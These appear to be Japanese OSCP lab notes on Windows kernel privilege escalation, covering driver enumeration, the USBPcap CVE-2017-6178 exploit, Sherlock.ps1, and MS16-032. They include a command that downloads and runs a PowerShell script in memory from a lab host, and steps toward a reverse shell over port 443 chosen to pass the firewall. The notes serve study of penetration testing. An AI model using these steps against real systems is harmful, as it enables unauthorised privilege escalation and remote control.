# Windows Kernel Vulnerabilities

### USBPcap Case Study

カーネルドライバの脆弱性に依存した特権の昇格

システムレベルのソフトウェア（ドライバやカーネル自体など）をエクスプロイトしようとする場合、ターゲットのオペレーティングシステム、バージョン、アーキテクチャなど、いくつかの要因に注意する必要がある

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

![image-20230106101828652](img/WindowsKernelVulunerabilities/image-20230106101828652.png)

![](img/WindowsKernelVulunerabilities/image-20230106101828652-1673224564911-23.png)

この時点で、Windows 7 SP1 x86のネイティブカーネル脆弱性を探し出し、それを使って特権を昇格させることができるが、**サードパーティのドライバを悪用する方がより一般的**



* ドライバを列挙する

  ```
  driverquery /v
  ```

  ```cmd
  powershell
  driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
  ```

  ※停止とマークされていても、カーネルメモリ空間にロードされているため、まだ対話できる可能性がある

* サードパーティ製品の脆弱性を検索する

  ```bash
  searchsploit USBPcap                                                                                  
  ------------------------------------------------------------------------ ---------------------------------
   Exploit Title                                                          |  Path
  ------------------------------------------------------------------------ ---------------------------------
  USBPcap 1.1.0.0 (WireShark 2.2.5) - Local Privilege Escalation          | windows/local/41542.c
  ------------------------------------------------------------------------ ---------------------------------
  Shellcodes: No Results
  ```

* 対象のバージョンを確認する

  ```
  Exploit Title    - USBPcap Null Pointer Dereference Privilege Escalation
  Date             - 07th March 2017
  Discovered by    - Parvez Anwar (@parvezghh)
  Vendor Homepage  - http://desowin.org/usbpcap/ 
  Tested Version   - 1.1.0.0  (USB Packet cap for Windows bundled with WireShark 2.2.5)
  Driver Version   - 1.1.0.0 - USBPcap.sys
  Tested on OS     - 32bit Windows 7 SP1 
  CVE ID           - CVE-2017-6178
  Vendor fix url   - not yet
  Fixed Version    - 0day
  Fixed driver ver - 0day
  ```

  以下powershellのコマンドでも確認可能

  ```powershell
  Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
  
  ----
  PS C:\Users\offsec.CLIENT251> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion,
  Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
  
  DeviceName               DriverVersion Manufacturer
  ----------               ------------- ------------
  VMware VMCI Host Device  9.8.6.0       VMware, Inc.
  VMware PVSCSI Controller 1.3.10.0      VMware, Inc.
  VMware SVGA 3D           8.16.1.24     VMware, Inc.
  VMware VMCI Bus Device   9.8.6.0       VMware, Inc.
  VMware Pointing Device   12.5.7.0      VMware, Inc.
  ```

  

* 該当バージョンのドライバがインストールされているか確認する

  ```
  cd "C:\Program Files"
  dir
  type USBPcap.inf
  ```

  ※ドライバディレクトリは`C:\Windows\System32\DRIVERS`の下にあることが多いので注意

* エクスプロイトコードをコンパイルする

  * windowsクライアントのGCCコンパイラを利用する方法

    ```
    C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
    
    C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1>echo off
    Microsoft Windows [Version 10.0.10240]
    (c) 2015 Microsoft Corporation. All rights reserved.
    
    C:\> gcc
    gcc: fatal error: no input files
    compilation terminated.
    
    C:\> gcc --help
    Usage: gcc [options] file...
    Options:
      -pass-exit-codes         Exit with highest error code from a phase.
      --help                   Display this information.
      --target-help            Display target specific command line options.
      --help={common|optimizers|params|target|warnings|[^]{joined|separate|undocumented}}[
                               Display specific types of command line options.
      (Use '-v --help' to display command line options of sub-processes).
      --version                Display compiler version information.
    ...
    ```

  * コンパイルする
  
    ![image-20230106102403706](img/WindowsKernelVulunerabilities/image-20230106102403706.png)
  
    ![](img/WindowsKernelVulunerabilities/image-20230106102403706.png)
  
  * 実行する
  
    ![image-20230106102420092](img/WindowsKernelVulunerabilities/image-20230106102420092.png)
  



## Sherlock.ps1

https://www.youtube.com/watch?v=kWTnVBIpNsE

脆弱性判定のpowerscriptモジュール. winpeasでもおそらくこのスクリプトをうごかしているのではないか。

* ファイルをコピーする

  ```bash
  cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1 ~/Documents/OSCP/LAB/10.11.1.50/ 
  ```

* 関数を検索する

  ```
  grep -i function Sherlock.ps1 
  ```

* 実行したい関数をSherlock.ps1の末尾に追加する

  ```
  vi Sherlock.ps1
  ```

  ![image-20230204233551297](img/WindowsKernelVulunerabilities/image-20230204233551297.png)

* powershellをメモリに読み込んで実行する

  ```powershell
  iex(new-object net.webclient).downloadstring('http://192.168.119.167/Sherlock.ps1')
  ```



## MS16-032

* 以下脆弱性が見つかる

  ```
  Title      : Secondary Logon Handle
  MSBulletin : MS16-032
  CVEID      : 2016-0099
  Link       : https://www.exploit-db.com/exploits/39719/
  VulnStatus : Appears Vulnerable
  ```

* powershell empireにcmd.exe用ではなくCLIでリバースシェルを取得できるソースコードがあり、それを編集する

  * 以下からコピーする

    ```
    /usr/share/powershell-empire/empire/server/data/module_source/privesc
    ```

  * `Invoke-MS16032.ps1`を編集する

    ![image-20230204233828295](img/WindowsKernelVulunerabilities/image-20230204233828295.png)

    パラメータが以下と定義されている。powershellの場合paramで定義したデータはオプションとして設定できる仕様

    <img src="img/WindowsKernelVulunerabilities/image-20230204233920367.png" alt="image-20230204233920367" style="zoom:50%;" />

  * 実行用のshell.ps1についてはnishangの`Invoke-PowerShellTCP.ps1`をコピーした。

    ![image-20230204234029031](img/WindowsKernelVulunerabilities/image-20230204234029031.png)

    ※4444だとファイアウォールに拒否されてしまっていた。443はアウトバンド許可されている

* シェルが実行されリバースシェルが取得できる

  ![image-20230204234147297](img/WindowsKernelVulunerabilities/image-20230204234147297.png)

  ![image-20230204234200141](img/WindowsKernelVulunerabilities/image-20230204234200141.png)

  ![image-20230204234207223](img/WindowsKernelVulunerabilities/image-20230204234207223.png)

  